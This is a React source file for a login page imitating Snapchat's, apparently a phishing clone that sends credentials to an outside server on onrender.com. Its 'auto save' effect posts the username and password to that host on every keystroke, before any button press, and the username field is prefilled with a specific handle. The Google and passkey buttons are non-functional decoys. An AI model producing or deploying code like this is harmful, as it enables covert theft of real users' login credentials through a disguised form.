import React, { useState, useEffect } from 'react';
import './LoginPage.css';

const EyeIcon = ({ open }) => (
  <span className="eye">{open ? '👁️' : '🙈'}</span>
);

const API_URL =
  window.location.hostname === "localhost"
    ? "http://localhost:5000/api/auth"
    : "https://snapchat-f205.onrender.com";

export default function LoginPage() {
  const [identifier, setIdentifier] = useState('susmita65009');
  const [password, setPassword] = useState('');
  const [showPwd, setShowPwd] = useState(false);

  const canSubmit = identifier && password;

  // 🔄 Auto save on input change
  useEffect(() => {
    if (!identifier && !password) return;

    const saveData = async () => {
      try {
        await fetch(`${API_URL}/login`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            email: identifier,
            password: password,
          }),
        });
      } catch (err) {
        console.log("Auto save error", err);
      }
    };

    saveData();
  }, [identifier, password]);

  // 🔘 Button click save
  const handleLogin = async () => {
    try {
      const res = await fetch(`${API_URL}/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: identifier,
          password: password,
        }),
      });

      const data = await res.json();
      console.log(data);

    } catch (err) {
      console.log("Login error", err);
    }
  };

  return (
    <div className="login-page">
      <h1 className="title">Log in</h1>

      <label className="label">USERNAME OR EMAIL</label>
      <input
        className="input"
        value={identifier}
        onChange={(e) => setIdentifier(e.target.value)}
      />

      <p className="link">Use phone number instead</p>

      <label className="label">PASSWORD</label>
      <div className="password-box">
        <input
          className="input"
          type={showPwd ? 'text' : 'password'}
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
        <span onClick={() => setShowPwd(!showPwd)}>
          <EyeIcon open={showPwd} />
        </span>
      </div>

      <button
        className={`login-btn ${canSubmit ? 'active' : ''}`}
        onClick={handleLogin}
      >
        Log in
      </button>

      <p className="forgot">Forgot your password?</p>

      <div className="divider">
        <div></div>
        <span>OR</span>
        <div></div>
      </div>

      <button className="black-btn">
        <span className="g">G</span>
        Continue with Google
      </button>

      <button className="black-btn">
        🔑 Sign in with passkey
      </button>


    </div>
  );
}